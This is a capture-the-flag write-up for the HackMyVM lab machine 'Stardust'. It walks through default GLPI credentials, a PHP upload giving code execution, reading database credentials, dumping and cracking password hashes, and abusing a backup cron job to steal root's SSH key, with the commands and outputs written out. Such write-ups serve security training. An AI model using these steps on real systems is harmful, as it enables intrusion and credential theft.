# Stardust

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.176:22
Open 10.0.2.176:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.176
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: C01D32D71C01C8426D635C68C4648B09
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/stardust/writeup.png)

- [https://forum.glpi-project.org/viewtopic.php?id=23219](https://forum.glpi-project.org/viewtopic.php?id=23219)

You have 4 different profiles  
- glpi/glpi (super-admin)  
- tech/tech 
- postonly/postonly (only for helpdesk)  
- normal/normal

> Creds: `glpi:glpi`

![writeup-1.png](/assets/pentest/hackmyvm/stardust/writeup-1.png)

PHP is not allowed, so enable it as super admin
- **[How to enable specific extensions in upload](https://forum.glpi-project.org/viewtopic.php?id=288795)**

Upload

![writeup-2.png](/assets/pentest/hackmyvm/stardust/writeup-2.png)

Uploaded files in GLPI are stored in the server's filesystem, typically within the `glpi/files/` directory (or configured path like `/var/lib/glpi/files`), organized into subfolders like `_uploads` and `_pictures`, with files moved from temporary uploads into their final associated item's storage area, often requiring correct web server user permissions ([www-data](https://www.google.com/search?client=opera-gx&q=www-data&sourceid=opera&ie=UTF-8&oe=UTF-8&mstk=AUtExfDbNrAuExUxbiOfYq7Xz8thUxBRb2NZKwTLffsUVJT6_gK2vYNy8wOUlmoLXkQf3vyE3zO-37xuX-Eyqk4jng_sy9_AbRjEPVUm2Fz5njbo9JrHpBn2HIuIW5AQlGDayakLb9QmEQGa5fCJpdqwlVFaR3jAPPBh1UjYl6hpB9k4QHF82Ma1wx20stBsEW8PMfzQZzvOJZR-sKxq-T97p1lvvcaFC0C7hwlYUMrjkAxEs8kb0yBog_fYZQ0ltVC16TgkpLBHuHgOHj5aEls_xazddCEJweZDJNOboIfmZL6VUw&csui=3&ved=2ahUKEwj-tZDDg_WRAxUsSPEDHeLBEKAQgK4QegQIARAD)) for access.

Uploaded file can be found, but it's not rendering as PHP

![writeup-3.png](/assets/pentest/hackmyvm/stardust/writeup-3.png)

If you upload files they temporarily stay in `/files/_tmp/`

![writeup-4.png](/assets/pentest/hackmyvm/stardust/writeup-4.png)

Execution is successful here!

![writeup-5.png](/assets/pentest/hackmyvm/stardust/writeup-5.png)

## Lateral Movement

```bash
www-data@stardust.hmv:…/www/html# cat config/config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'D6jsxBGekO';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

```bash
www-data@stardust.hmv:…/www/html# mysql -u'glpi' -p'D6jsxBGekO' -e 'SHOW DATABASES;'
glpi
information_schema
intranetikDB

www-data@stardust.hmv:…/www/html# mysql -u'glpi' -p'D6jsxBGekO' 'intranetikDB' -e 'SHOW TABLES;'
users

www-data@stardust.hmv:…/www/html# mysql -u'glpi' -p'D6jsxBGekO' 'intranetikDB' -e 'SELECT CONCAT(username,":",password) FROM users;'
carolynn:$2b$12$HRVJrlSG5eSW44VaNlTwoOwu42c1l9AnbpOhDvcEXVMyhcB46ZtXC
chi-yin:$2b$12$.sDM7vxQCe3nmOois5Ho4O1HkNEiz4UJ/9XEsYlnbH7Awlxfig3g2
tally:$2b$12$zzVJjW1Bvm4WqcPy6nqDFOU4JRh2mMpbeKKbP21cn7FKtNy4Ycjl.
jeraldine:$2b$12$gjwlFI7f1QABeZ5jKlbTh.L00oIBXxHOUH.Gah.SXnX4PPrLd0mI6
ishmael:$2b$12$eEeCfKVkmFCvXjubRp.GhOKNTz0JoVXoKYCM3/kylN8AMzoDVEoWC
hetty:$2b$12$uu719jU2sXy.blBj2QEPR.7mg2UbVfL5eX9KM4aXV5rigHWjFGNvO
yvan:$2b$12$QJZj2WvvQU6c2GjpmW/Z9O0Ggudv5hhrREfqfJK7jjDWAa7.GoTM.
nong:$2b$12$JWqnC1emWOLZszg1bWX3her2xFp47ZLE5MEd0YitoUDbVHH6lBPHW
ande:$2b$12$03pXHnhLpgaGfeY72FtwJ.1T5IgCxHF.1PrPUVFySI4fIV3Gnykvq
colleen:$2b$12$ZwPxWr9.g5VoiFQfWUJtgeTuNcpzpD44BrOVRafrnXHIa3Pc9mK1C
gussi:$2b$12$f/05LxKgsAt6KNJ676sG/.90OvOMyUxuP2OdtZ9d8AnSmhP8ZIIA2
brandi:$2b$12$wQKGmPPRclBk4KpT3e44q.EOIh.xki.70W62xDuPnybXKYeXOSd2u
karrie:$2b$12$bZVRUGzKjDGqOGKzWgcWUehPiwBseDScXfmsTZJb.r58Uc5uxFFUC
maala:$2b$12$D0kAwa0fGU055rUnPJHMLuuB0fHcGjKbjLw9oNi/IMFkbzP980fvS
brittany:$2b$12$hgjI3XifZTqfMCSM4TOqTObHNLNvkT0FhwiAJ7zr/GGLM58b4ieVC

www-data@stardust.hmv:…/www/html# grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
tally:x:1000:1000:,,,:/home/tally:/bin/bash
```

Crack `tally`'s password
```powershell
PS> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt 
bonita           (tally)
```

## SSH

```bash
└─$ sshpass -p 'bonita' ssh tally@10.0.2.176
tally@stardust:~$ id
uid=1000(tally) gid=1000(tally) groups=1000(tally)
```

### User.txt

```bash
tally@stardust:~$ cat user.txt
f4c0971d361c2844bb9730846dc330c2
```

## Privilege Escalation

Looks like a cronjob
```bash
tally@stardust:/opt$ cat meteo
#!/bin/bash

#meteo
config="/opt/config.json"
latitude=$(jq '.latitude' $config)
longitude=$(jq '.longitude' $config)
limit=1000

#sys
web="/var/www/intranetik"
users="/home/tally"
root="/root"
dest="/var/backups"

#get rain elevation
elevation=$(curl -s "https://api.open-meteo.com/v1/forecast?latitude=$latitude&longitude=$longitude&hourly=rain" |jq .elevation)

if [[ $elevation -gt $limit ]] ; then
	echo "RAIN ALERT !"
	tar -cf $dest/backup.tar $web >/dev/null
	tar -rf $dest/backup.tar $users >/dev/null
	tar -rf $dest/backup.tar $root >/dev/null
	echo "BACKUP FINISHED"
else
	echo "Weather is cool !"
fi
```

`config` is writable
```bash
tally@stardust:/opt$ ls -Alh
total 8.0K
-rw-rw-r--+ 1 root root  49 May  8  2023 config.json
-rwxr-xr-x  1 root root 607 May  7  2023 meteo

tally@stardust:/opt$ getfacl config.json
# file: config.json
# owner: root
# group: root
user::rw-
user:tally:rw-
group::r--
mask::rw-
other::r--

tally@stardust:/opt$ cat config.json
{
  "latitude":  -18.48,
  "longitude": -70.33
}
```

The country where the entire landmass is **above an elevation of 1,000 meters** (3,281 feet) is **Lesotho**.

```bash
tally@stardust:/opt$ echo '{"latitude":-29.5,"longitude":28.25}' > config.json
tally@stardust:/opt$ ./meteo
RAIN ALERT !
...
```

Wait for cronjob

```bash
tally@stardust:/tmp$ cp /var/backups/backup.tar .
tally@stardust:/tmp$ tar -xvf backup.tar
...
root/.ssh/id_rsa
root/root.txt
...
```

```bash
tally@stardust:/tmp$ ssh -i root/.ssh/id_rsa -l root 0
root@stardust:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@stardust:~# cat root.txt
052cf26a6e7e33790391c0d869e2e40c
```